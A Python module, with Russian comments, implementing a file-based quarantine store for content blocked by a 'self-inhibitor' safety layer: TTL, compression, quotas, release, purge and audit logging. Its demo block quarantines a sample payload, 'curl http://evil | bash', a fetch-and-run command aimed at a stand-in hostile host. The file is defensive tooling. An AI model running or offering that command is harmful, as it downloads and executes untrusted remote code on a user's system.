# core-systems/genius_core/security/self_inhibitor/runtime/quarantine.py
from __future__ import annotations

import asyncio
import datetime as _dt
import gzip
import io
import json
import os
import re
import shutil
import stat
import tempfile
import time
import uuid
from dataclasses import dataclass, field, asdict
from enum import Enum
from hashlib import sha256
from typing import Any, Dict, Iterable, List, Mapping, Optional, Sequence, Tuple, Union

# Опциональная интеграция с SelfInhibitor; не ломаемся при отсутствии пакета/инициализации.
try:  # корректный относительный импорт, если self_inhibitor является пакетом
    from ..self_inhibitor import InhibitionDecision, InhibitionAction  # type: ignore
except Exception:  # запасной тип-хинт без зависимости
    class InhibitionAction(str, Enum):  # type: ignore
        ALLOW = "ALLOW"
        SANITIZE = "SANITIZE"
        BLOCK = "BLOCK"
        ESCALATE = "ESCALATE"

    @dataclass  # type: ignore
    class InhibitionDecision:
        allowed: bool
        action: InhibitionAction
        score: float
        reasons: List[str]
        redacted_text: Optional[str] = None
        actor_id: Optional[str] = None
        correlation_id: str = ""
        timestamp_ms: int = 0


SCHEMA_VERSION = 1


class QuarantineStatus(str, Enum):
    QUARANTINED = "QUARANTINED"
    RELEASED = "RELEASED"
    PURGED = "PURGED"


@dataclass
class QuarantinePolicy:
    default_ttl_sec: int = 3 * 24 * 3600            # 3 суток
    max_store_bytes: int = 10 * 1024 * 1024 * 1024  # 10 GiB
    max_item_bytes: int = 32 * 1024 * 1024          # 32 MiB (до компрессии)
    compress: bool = True                           # gzip больших текстов/байтов
    compress_threshold: int = 4 * 1024              # >4 KiB — пробуем gzip
    text_media_type: str = "text/plain; charset=utf-8"
    binary_media_type: str = "application/octet-stream"


@dataclass
class QuarantineRecord:
    record_id: str
    created_ts: int
    actor_id: Optional[str]
    reason: str
    severity: int                              # 1..10
    ttl_sec: int
    expires_ts: int
    status: QuarantineStatus
    sha256_hex: str
    size_bytes: int                            # исходный размер payload
    stored_bytes: int                          # размер на диске
    media_type: str
    compression: str                           # none|gzip
    tags: List[str] = field(default_factory=list)
    # относительные пути внутри корня quarantine
    meta_path: str = ""
    data_path: str = ""
    # снимок решения self-inhibitor (опционально)
    decision: Optional[Dict[str, Any]] = None
    # краткая выжимка для быстрых обзоров
    excerpt: Optional[str] = None
    schema_version: int = SCHEMA_VERSION
    released_ts: Optional[int] = None


def _utc_now_ms() -> int:
    return int(time.time() * 1000)


def _ts_to_iso(ts_ms: int) -> str:
    return _dt.datetime.utcfromtimestamp(ts_ms / 1000.0).isoformat() + "Z"


def _new_id(prefix: str = "q") -> str:
    t = _utc_now_ms()
    return f"{prefix}-{t}-{uuid.uuid4().hex[:12]}"


def _safe_join(root: str, *parts: str) -> str:
    # Строгий safe join: запрещаем уход за пределы root
    candidate = os.path.abspath(os.path.join(root, *parts))
    root_abs = os.path.abspath(root)
    if os.path.commonpath([candidate, root_abs]) != root_abs:
        raise ValueError("unsafe path traversal prevented")
    return candidate


def _atomic_write(path: str, data: Union[bytes, str]) -> None:
    os.makedirs(os.path.dirname(path), exist_ok=True)
    mode = "wb" if isinstance(data, (bytes, bytearray)) else "w"
    tmp_fd, tmp_path = tempfile.mkstemp(prefix=".tmp.", dir=os.path.dirname(path))
    try:
        with os.fdopen(tmp_fd, mode) as f:
            f.write(data)  # type: ignore
        os.replace(tmp_path, path)
    finally:
        with contextlib_suppress(FileNotFoundError):
            os.unlink(tmp_path)


def _file_sha256(path: str, chunk: int = 1 << 20) -> Tuple[str, int]:
    h = sha256()
    total = 0
    with open(path, "rb") as f:
        while True:
            b = f.read(chunk)
            if not b:
                break
            total += len(b)
            h.update(b)
    return h.hexdigest(), total


def _bytes_sha256(b: bytes) -> str:
    return sha256(b).hexdigest()


def _excerpt_from_bytes(b: bytes, limit: int = 160) -> str:
    # Пытаемся как utf-8, иначе — base16
    try:
        s = b.decode("utf-8", errors="replace")
        s = re.sub(r"\s+", " ", s).strip()
        return s[:limit]
    except Exception:
        return b.hex()[:limit]


class QuarantineManager:
    """
    Файловое карантин-хранилище с атомарными операциями и TTL.

    Структура:
      <root>/
        items/<id>/meta.json
        items/<id>/data           (или data.gz)
        released/<id>/meta.json   (мета после release)
        .quota/size.json          (опциональная оценка суммарного размера)
    """

    def __init__(self, root: str, policy: Optional[QuarantinePolicy] = None, audit_logger_name: str = "quarantine") -> None:
        self.root = os.path.abspath(root)
        self.items_dir = _safe_join(self.root, "items")
        self.released_dir = _safe_join(self.root, "released")
        self.quota_dir = _safe_join(self.root, ".quota")
        self.policy = policy or QuarantinePolicy()
        os.makedirs(self.items_dir, exist_ok=True)
        os.makedirs(self.released_dir, exist_ok=True)
        os.makedirs(self.quota_dir, exist_ok=True)
        self._log = _get_logger(audit_logger_name)

    # ---------------------------- Публичное API -------------------------------

    def quarantine_text(
        self,
        text: str,
        *,
        actor_id: Optional[str],
        reason: str,
        severity: int = 7,
        ttl_sec: Optional[int] = None,
        tags: Optional[Sequence[str]] = None,
        decision: Optional[InhibitionDecision] = None,
    ) -> QuarantineRecord:
        b = text.encode("utf-8")
        return self._quarantine_bytes(b, media_type=self.policy.text_media_type, actor_id=actor_id,
                                      reason=reason, severity=severity, ttl_sec=ttl_sec, tags=tags, decision=decision)

    def quarantine_bytes(
        self,
        data: bytes,
        *,
        actor_id: Optional[str],
        reason: str,
        severity: int = 7,
        ttl_sec: Optional[int] = None,
        tags: Optional[Sequence[str]] = None,
        media_type: Optional[str] = None,
        decision: Optional[InhibitionDecision] = None,
    ) -> QuarantineRecord:
        return self._quarantine_bytes(data, media_type=media_type or self.policy.binary_media_type,
                                      actor_id=actor_id, reason=reason, severity=severity,
                                      ttl_sec=ttl_sec, tags=tags, decision=decision)

    def quarantine_file(
        self,
        src_path: str,
        *,
        actor_id: Optional[str],
        reason: str,
        severity: int = 7,
        ttl_sec: Optional[int] = None,
        tags: Optional[Sequence[str]] = None,
        media_type: Optional[str] = None,
        decision: Optional[InhibitionDecision] = None,
        move: bool = False,
    ) -> QuarantineRecord:
        src_path = os.path.abspath(src_path)
        if not os.path.isfile(src_path):
            raise FileNotFoundError(src_path)
        sha, size = _file_sha256(src_path)
        if size > self.policy.max_item_bytes:
            raise ValueError(f"item too large: {size} > {self.policy.max_item_bytes}")

        rid = _new_id()
        item_dir = _safe_join(self.items_dir, rid)
        data_path = _safe_join(item_dir, "data")
        os.makedirs(item_dir, exist_ok=True)

        # Перемещение или копирование
        if move:
            os.replace(src_path, data_path)
        else:
            shutil.copy2(src_path, data_path)

        # Компрессия по порогу (только если текст/небинарный и выгодно)
        stored_bytes = os.path.getsize(data_path)
        compression = "none"
        if self.policy.compress and stored_bytes >= self.policy.compress_threshold:
            gz_path = data_path + ".gz"
            _gzip_file(data_path, gz_path)
            gz_size = os.path.getsize(gz_path)
            if gz_size < stored_bytes:
                os.remove(data_path)
                data_path = gz_path
                stored_bytes = gz_size
                compression = "gzip"
            else:
                os.remove(gz_path)

        rec = self._create_record(
            rid=rid,
            actor_id=actor_id,
            reason=reason,
            severity=severity,
            ttl_sec=ttl_sec,
            sha_hex=sha,
            size_bytes=size,
            stored_bytes=stored_bytes,
            media_type=media_type or self.policy.binary_media_type,
            compression=compression,
            data_rel=os.path.relpath(data_path, self.root),
            decision=decision,
            excerpt=_excerpt_from_bytes(_read_bytes(data_path)),
            tags=tags,
        )
        self._persist_meta(rec)
        self._emit_log("QUARANTINE_FILE", rec)
        self._enforce_quota()
        return rec

    # --------------------------- Управление записями --------------------------

    def release(self, record_id: str, note: Optional[str] = None) -> QuarantineRecord:
        rec = self.get(record_id)
        if rec.status != QuarantineStatus.QUARANTINED:
            return rec
        rec.status = QuarantineStatus.RELEASED
        rec.released_ts = _utc_now_ms()
        if note:
            rec.tags = list(sorted(set(list(rec.tags) + [f"released:{note}"])))
        # Переносим метаданные в released/, payload остаётся только как ссылка path (не копируем)
        src_meta = _safe_join(self.root, rec.meta_path)
        dst_dir = _safe_join(self.released_dir, record_id)
        os.makedirs(dst_dir, exist_ok=True)
        dst_meta = _safe_join(dst_dir, "meta.json")
        _atomic_write(dst_meta, _json_dumps(rec))
        rec.meta_path = os.path.relpath(dst_meta, self.root)
        # Старый meta.json можно оставить (audit-след) либо удалить; оставим
        self._emit_log("RELEASE", rec)
        return rec

    def purge(self, record_id: str) -> bool:
        rec = self.get(record_id)
        ok = False
        # Удаляем папку items/<id> и released/<id>
        for base in (self.items_dir, self.released_dir):
            path = _safe_join(base, record_id)
            if os.path.isdir(path):
                shutil.rmtree(path, ignore_errors=True)
                ok = True
        rec.status = QuarantineStatus.PURGED
        self._emit_log("PURGE", rec)
        return ok

    def cleanup_expired(self) -> int:
        """Удаляет все просроченные записи. Возвращает число удалённых."""
        now = _utc_now_ms()
        removed = 0
        for rec in self.list(status=QuarantineStatus.QUARANTINED):
            if rec.expires_ts <= now:
                if self.purge(rec.record_id):
                    removed += 1
        return removed

    def export_zip(self, record_ids: Sequence[str], zip_path: str) -> str:
        import zipfile
        abs_zip = os.path.abspath(zip_path)
        os.makedirs(os.path.dirname(abs_zip), exist_ok=True)
        with zipfile.ZipFile(abs_zip, "w", compression=zipfile.ZIP_DEFLATED) as z:
            for rid in record_ids:
                rec = self.get(rid)
                meta_abs = _safe_join(self.root, rec.meta_path)
                data_abs = _safe_join(self.root, rec.data_path)
                z.write(meta_abs, arcname=f"{rid}/meta.json")
                z.write(data_abs, arcname=f"{rid}/data" + (".gz" if rec.compression == "gzip" else ""))
        return abs_zip

    # --------------------------- Доступ/чтение --------------------------------

    def get(self, record_id: str) -> QuarantineRecord:
        # Ищем в items/<id>/meta.json, затем released/<id>/meta.json
        for base in (self.items_dir, self.released_dir):
            meta = _safe_join(base, record_id, "meta.json")
            if os.path.isfile(meta):
                with open(meta, "r", encoding="utf-8") as f:
                    doc = json.load(f)
                return _record_from_json(doc)
        raise KeyError(record_id)

    def list(
        self,
        *,
        status: Optional[QuarantineStatus] = None,
        actor_id: Optional[str] = None,
        tag_contains: Optional[str] = None,
        limit: Optional[int] = None,
        newer_than_ts: Optional[int] = None,
        older_than_ts: Optional[int] = None,
    ) -> List[QuarantineRecord]:
        out: List[QuarantineRecord] = []
        # Сканирование двух корней
        for base, st in ((self.items_dir, QuarantineStatus.QUARANTINED), (self.released_dir, QuarantineStatus.RELEASED)):
            if status and st != status:
                continue
            if not os.path.isdir(base):
                continue
            for rid in os.listdir(base):
                meta = os.path.join(base, rid, "meta.json")
                if not os.path.isfile(meta):
                    continue
                try:
                    with open(meta, "r", encoding="utf-8") as f:
                        doc = json.load(f)
                    rec = _record_from_json(doc)
                except Exception:
                    continue
                if actor_id and rec.actor_id != actor_id:
                    continue
                if newer_than_ts and rec.created_ts <= newer_than_ts:
                    continue
                if older_than_ts and rec.created_ts >= older_than_ts:
                    continue
                if tag_contains and not any(tag_contains in t for t in rec.tags):
                    continue
                out.append(rec)
        out.sort(key=lambda r: r.created_ts, reverse=True)
        if limit:
            out = out[:limit]
        return out

    def read_payload(self, record_id: str) -> bytes:
        rec = self.get(record_id)
        path = _safe_join(self.root, rec.data_path)
        b = _read_bytes(path)
        if rec.compression == "gzip":
            return gzip.decompress(b)
        return b

    # ------------------------ Интеграция с inhibitor --------------------------

    def from_decision(
        self,
        text: str,
        decision: InhibitionDecision,
        *,
        quarantine_on: Sequence[InhibitionAction] = (InhibitionAction.BLOCK, InhibitionAction.ESCALATE),
        actor_id: Optional[str] = None,
        severity_map: Mapping[InhibitionAction, int] = None,
        reason_prefix: str = "inhibitor",
        tags: Optional[Sequence[str]] = None,
    ) -> Optional[QuarantineRecord]:
        """
        Принимает решение SelfInhibitor и, если действие попадает под quarantine_on,
        сохраняет исходный текст в карантин.
        """
        severity_map = severity_map or {
            InhibitionAction.BLOCK: 8,
            InhibitionAction.ESCALATE: 9,
            InhibitionAction.SANITIZE: 6,
            InhibitionAction.ALLOW: 1,
        }
        if decision.action not in quarantine_on:
            return None
        reason = f"{reason_prefix}:{decision.action.value}:{','.join(decision.reasons[:3])}"
        actor = actor_id or getattr(decision, "actor_id", None)
        return self.quarantine_text(
            text,
            actor_id=actor,
            reason=reason,
            severity=severity_map.get(decision.action, 7),
            tags=list(tags or []) + ["source:self_inhibitor"],
            decision=decision,
        )

    def quarantine_action(self, *, actor_id: Optional[str], reason: str, severity: int = 7, tags: Optional[Sequence[str]] = None):
        """
        Обёртка: возвращает callable, который поместит «запрос + результат/исключение» в карантин,
        удобно использовать при выполнении потенциально опасных действий.
        """
        mgr = self

        def _wrap(data: Union[str, bytes], meta: Optional[Mapping[str, Any]] = None) -> QuarantineRecord:
            payload = data.encode("utf-8") if isinstance(data, str) else data
            rec = mgr.quarantine_bytes(payload, actor_id=actor_id, reason=reason, severity=severity, tags=tags)
            if meta:
                # допишем расширенные метаданные поверх meta.json
                path = _safe_join(mgr.root, rec.meta_path)
                with open(path, "r", encoding="utf-8") as f:
                    doc = json.load(f)
                doc.setdefault("extra", {}).update({k: v for k, v in meta.items()})
                _atomic_write(path, _json_dumps(doc))
            return rec

        return _wrap

    # -------------------------- Асинхронный API -------------------------------

    async def aquarantine_text(self, *args, **kwargs) -> QuarantineRecord:
        return await asyncio.to_thread(self.quarantine_text, *args, **kwargs)

    async def aquarantine_bytes(self, *args, **kwargs) -> QuarantineRecord:
        return await asyncio.to_thread(self.quarantine_bytes, *args, **kwargs)

    async def aquarantine_file(self, *args, **kwargs) -> QuarantineRecord:
        return await asyncio.to_thread(self.quarantine_file, *args, **kwargs)

    async def aget(self, record_id: str) -> QuarantineRecord:
        return await asyncio.to_thread(self.get, record_id)

    async def alist(self, **kwargs) -> List[QuarantineRecord]:
        return await asyncio.to_thread(self.list, **kwargs)

    async def aread_payload(self, record_id: str) -> bytes:
        return await asyncio.to_thread(self.read_payload, record_id)

    async def arelease(self, record_id: str, note: Optional[str] = None) -> QuarantineRecord:
        return await asyncio.to_thread(self.release, record_id, note)

    async def apurge(self, record_id: str) -> bool:
        return await asyncio.to_thread(self.purge, record_id)

    async def acleanup_expired(self) -> int:
        return await asyncio.to_thread(self.cleanup_expired)

    # ---------------------------- Внутреннее ----------------------------------

    def _quarantine_bytes(
        self,
        data: bytes,
        *,
        media_type: str,
        actor_id: Optional[str],
        reason: str,
        severity: int,
        ttl_sec: Optional[int],
        tags: Optional[Sequence[str]],
        decision: Optional[InhibitionDecision],
    ) -> QuarantineRecord:
        if len(data) > self.policy.max_item_bytes:
            raise ValueError(f"item too large: {len(data)} > {self.policy.max_item_bytes}")

        rid = _new_id()
        item_dir = _safe_join(self.items_dir, rid)
        data_path = _safe_join(item_dir, "data")
        os.makedirs(item_dir, exist_ok=True)

        stored_bytes = len(data)
        compression = "none"
        to_store = data
        if self.policy.compress and len(data) >= self.policy.compress_threshold:
            gz = gzip.compress(data, compresslevel=6)
            if len(gz) < len(data):
                to_store = gz
                data_path += ".gz"
                stored_bytes = len(gz)
                compression = "gzip"

        _atomic_write(data_path, to_store)
        sha_hex = _bytes_sha256(data)

        rec = self._create_record(
            rid=rid,
            actor_id=actor_id,
            reason=reason,
            severity=severity,
            ttl_sec=ttl_sec,
            sha_hex=sha_hex,
            size_bytes=len(data),
            stored_bytes=stored_bytes,
            media_type=media_type,
            compression=compression,
            data_rel=os.path.relpath(data_path, self.root),
            decision=decision,
            excerpt=_excerpt_from_bytes(data),
            tags=tags,
        )
        self._persist_meta(rec)
        self._emit_log("QUARANTINE", rec)
        self._enforce_quota()
        return rec

    def _create_record(
        self,
        *,
        rid: str,
        actor_id: Optional[str],
        reason: str,
        severity: int,
        ttl_sec: Optional[int],
        sha_hex: str,
        size_bytes: int,
        stored_bytes: int,
        media_type: str,
        compression: str,
        data_rel: str,
        decision: Optional[InhibitionDecision],
        excerpt: Optional[str],
        tags: Optional[Sequence[str]],
    ) -> QuarantineRecord:
        now = _utc_now_ms()
        ttl = int(self.policy.default_ttl_sec if ttl_sec is None else ttl_sec)
        rec = QuarantineRecord(
            record_id=rid,
            created_ts=now,
            actor_id=actor_id,
            reason=reason,
            severity=int(max(1, min(10, severity))),
            ttl_sec=ttl,
            expires_ts=now + ttl * 1000,
            status=QuarantineStatus.QUARANTINED,
            sha256_hex=sha_hex,
            size_bytes=size_bytes,
            stored_bytes=stored_bytes,
            media_type=media_type,
            compression=compression,
            data_path=data_rel,
            meta_path=os.path.relpath(_safe_join(self.items_dir, rid, "meta.json"), self.root),
            decision=_decision_snapshot(decision),
            excerpt=excerpt,
            tags=list(dict.fromkeys(tags or [])),
        )
        return rec

    def _persist_meta(self, rec: QuarantineRecord) -> None:
        meta_abs = _safe_join(self.root, rec.meta_path)
        _atomic_write(meta_abs, _json_dumps(rec))

    def _enforce_quota(self) -> None:
        # Простой best-effort: если превышен max_store_bytes — удаляем старые просроченные,
        # затем самые старые QUARANTINED до соблюдения квоты.
        try:
            total = _dir_size_bytes(self.items_dir) + _dir_size_bytes(self.released_dir)
            if total <= self.policy.max_store_bytes:
                return
            # 1) purge expired
            self.cleanup_expired()
            total = _dir_size_bytes(self.items_dir) + _dir_size_bytes(self.released_dir)
            if total <= self.policy.max_store_bytes:
                return
            # 2) purge oldest quarantined
            by_age = self.list(status=QuarantineStatus.QUARANTINED)
            for rec in reversed(by_age):  # от самых старых
                if total <= self.policy.max_store_bytes:
                    break
                if self.purge(rec.record_id):
                    total -= (rec.stored_bytes + 4096)  # приблизительно
        except Exception:
            # Никогда не падаем из-за квоты
            pass

    def _emit_log(self, event: str, rec: QuarantineRecord) -> None:
        payload = {
            "ts": rec.created_ts,
            "event": event,
            "id": rec.record_id,
            "actor_id": rec.actor_id,
            "reason": rec.reason,
            "severity": rec.severity,
            "status": rec.status,
            "size": rec.size_bytes,
            "stored": rec.stored_bytes,
            "media_type": rec.media_type,
            "compression": rec.compression,
            "expires_at": _ts_to_iso(rec.expires_ts),
            "tags": rec.tags[:20],
        }
        try:
            self._log.info(json.dumps(payload, ensure_ascii=False))
        except Exception:
            pass


# ----------------------------- Контекст-менеджер ------------------------------

class quarantine_on_exception:
    """
    Контекст-менеджер: при исключении помещает сообщение об ошибке и контекст в карантин.
      with quarantine_on_exception(mgr, actor_id="user42", reason="dangerous op"):
          ... опасный код ...
    """
    def __init__(self, manager: QuarantineManager, *, actor_id: Optional[str], reason: str, severity: int = 8, tags: Optional[Sequence[str]] = None, swallow: bool = False):
        self.mgr = manager
        self.actor_id = actor_id
        self.reason = reason
        self.severity = severity
        self.tags = list(tags or []) + ["exception"]
        self.swallow = swallow

    def __enter__(self):
        return self

    def __exit__(self, et, ev, tb) -> bool:
        if et is not None:
            import traceback
            buf = "".join(traceback.format_exception(et, ev, tb))
            meta = f"Unhandled exception: {et.__name__}: {ev}"
            self.mgr.quarantine_text(buf, actor_id=self.actor_id, reason=self.reason + ":" + meta, severity=self.severity, tags=self.tags)
        return bool(self.swallow)


# ------------------------------- Вспомогательное ------------------------------

def _json_dumps(rec_or_dict: Union[QuarantineRecord, Dict[str, Any]]) -> str:
    if isinstance(rec_or_dict, QuarantineRecord):
        data = asdict(rec_or_dict)
        # Enum -> value
        data["status"] = rec_or_dict.status.value
    else:
        data = rec_or_dict
    return json.dumps(data, ensure_ascii=False, indent=2, sort_keys=True)


def _record_from_json(doc: Mapping[str, Any]) -> QuarantineRecord:
    return QuarantineRecord(
        record_id=doc["record_id"],
        created_ts=int(doc["created_ts"]),
        actor_id=doc.get("actor_id"),
        reason=doc["reason"],
        severity=int(doc["severity"]),
        ttl_sec=int(doc["ttl_sec"]),
        expires_ts=int(doc["expires_ts"]),
        status=QuarantineStatus(doc["status"]),
        sha256_hex=doc["sha256_hex"],
        size_bytes=int(doc["size_bytes"]),
        stored_bytes=int(doc["stored_bytes"]),
        media_type=doc["media_type"],
        compression=doc.get("compression", "none"),
        tags=list(doc.get("tags", [])),
        meta_path=doc["meta_path"],
        data_path=doc["data_path"],
        decision=doc.get("decision"),
        excerpt=doc.get("excerpt"),
        schema_version=int(doc.get("schema_version", SCHEMA_VERSION)),
        released_ts=doc.get("released_ts"),
    )


def _gzip_file(src: str, dst: str) -> None:
    with open(src, "rb") as fi, gzip.open(dst, "wb", compresslevel=6) as fo:
        shutil.copyfileobj(fi, fo)


def _read_bytes(path: str) -> bytes:
    with open(path, "rb") as f:
        return f.read()


def _dir_size_bytes(path: str) -> int:
    total = 0
    for root, dirs, files in os.walk(path):
        for fn in files:
            try:
                total += os.path.getsize(os.path.join(root, fn))
            except OSError:
                pass
    return total


def _decision_snapshot(decision: Optional[InhibitionDecision]) -> Optional[Dict[str, Any]]:
    if decision is None:
        return None
    # Снимок только безопасных полей
    return {
        "action": getattr(decision, "action", None).value if getattr(decision, "action", None) else None,
        "allowed": getattr(decision, "allowed", None),
        "score": getattr(decision, "score", None),
        "reasons": list(getattr(decision, "reasons", []) or [])[:10],
        "actor_id": getattr(decision, "actor_id", None),
        "correlation_id": getattr(decision, "correlation_id", ""),
        "timestamp_ms": getattr(decision, "timestamp_ms", 0),
    }


def _get_logger(name: str):
    import logging
    log = logging.getLogger(name)
    if not log.handlers:
        # Базовая настройка JSON-совместимого вывода полей; не трогаем глобальную конфигурацию.
        h = logging.StreamHandler()
        fmt = logging.Formatter('%(message)s')
        h.setFormatter(fmt)
        log.addHandler(h)
        log.setLevel(logging.INFO)
        log.propagate = False
    return log


class contextlib_suppress:
    """Локальный аналог contextlib.suppress без импорта модуля."""
    def __init__(self, *exceptions: Any) -> None:
        self._exceptions = exceptions

    def __enter__(self) -> None:
        return None

    def __exit__(self, exctype, excinst, exctb) -> bool:
        return exctype is not None and issubclass(exctype, self._exceptions)


# ------------------------------- Пример CLI -----------------------------------

if __name__ == "__main__":
    # Демонстрация работы
    mgr = QuarantineManager("./_quarantine")

    rec = mgr.quarantine_text("Suspicious payload; curl http://evil | bash", actor_id="user-1", reason="policy:block", severity=9, tags=["demo"])
    print("created:", rec.record_id, rec.status, rec.meta_path, rec.data_path)

    lst = mgr.list(limit=3)
    print("list:", [r.record_id for r in lst])

    payload = mgr.read_payload(rec.record_id)
    print("payload_len:", len(payload))

    zip_path = mgr.export_zip([rec.record_id], "./_quarantine/export.zip")
    print("exported:", zip_path)

    mgr.release(rec.record_id, note="manual-approval")
    print("released:", mgr.get(rec.record_id).status)

    removed = mgr.cleanup_expired()
    print("expired removed:", removed)
